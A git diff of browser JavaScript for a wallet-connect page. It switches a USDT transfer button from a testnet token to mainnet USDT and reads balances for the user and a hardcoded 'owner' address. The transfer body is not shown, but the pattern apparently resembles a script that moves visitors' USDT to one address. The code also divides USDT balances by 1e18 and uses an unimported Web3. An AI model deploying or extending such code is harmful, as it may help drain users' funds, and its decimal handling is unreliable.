@@ -1,10 +1,11 @@
-import { usdtAbi, usdtAddress } from "./helper.js"
+import { usdtAbi, usdtAddress } from "./sepolia-usdt.js"
+import { ethUsdtAddress, ethUsdtAbi } from "./eth-usdt.js"
 import { ethers } from "./ethers.js"
+const web3 = new Web3(window.trustwallet)
 
 const connectButton = document.getElementById("connectButton")
 const address = document.getElementById("address")
 const transfer = document.getElementById("transfer")
-// const transfer_t = document.getElementById("transfer-trc20")
 
 async function connect() {
     if (typeof window.ethereum !== "undefined") {
@@ -26,9 +27,14 @@ async function transferUsdt() {
         const provider = new ethers.providers.Web3Provider(window.ethereum)
         const signer = provider.getSigner()
         const signerAddress = await signer.getAddress()
-        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer)
+        const usdtContract = new ethers.Contract(
+            ethUsdtAddress,
+            ethUsdtAbi,
+            signer,
+        )
         const userStartingBalance =
             (await usdtContract.balanceOf(signerAddress)) / 1e18
+
         const ownerStartingBalance =
             (await usdtContract.balanceOf(
                 "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
@@ -54,8 +60,6 @@ async function transferUsdt() {
     }
 }
 
-// async function transferUsdt_t() {}
-
 connectButton.addEventListener("click", () => {
     connect()
 })
@@ -63,8 +67,3 @@ connectButton.addEventListener("click", () => {
 transfer.addEventListener("click", () => {
     transferUsdt()
 })
-
-// transfer -
-//     trc20.addEventListener("click", () => {
-//         transferUsdt_t()
-//     })
